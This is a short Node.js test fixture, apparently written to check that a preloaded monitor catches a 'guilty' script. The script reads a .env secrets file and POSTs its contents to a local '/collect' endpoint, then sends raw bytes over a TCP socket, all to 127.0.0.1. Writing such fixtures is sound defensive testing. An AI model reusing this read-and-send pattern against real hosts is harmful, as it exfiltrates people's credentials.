// CJS "guilty" fixture. Destructured require bindings, taken at load time (after the preload ran).
'use strict';
const { readFileSync } = require('fs');
const http = require('http');
const net = require('net');
const { join } = require('path');

const home = process.env.GUILTY_HOME;
const body = readFileSync(join(home, '.env'), 'utf8');
const req = http.request({ host: '127.0.0.1', port: process.env.GUILTY_HTTP_PORT, path: '/collect', method: 'POST' }, (res) => {
  res.resume();
  res.on('end', () => {
    const s = net.connect(Number(process.env.GUILTY_TCP_PORT), '127.0.0.1', () => s.end(Buffer.alloc(100, 0x41)));
  });
});
req.end(body);
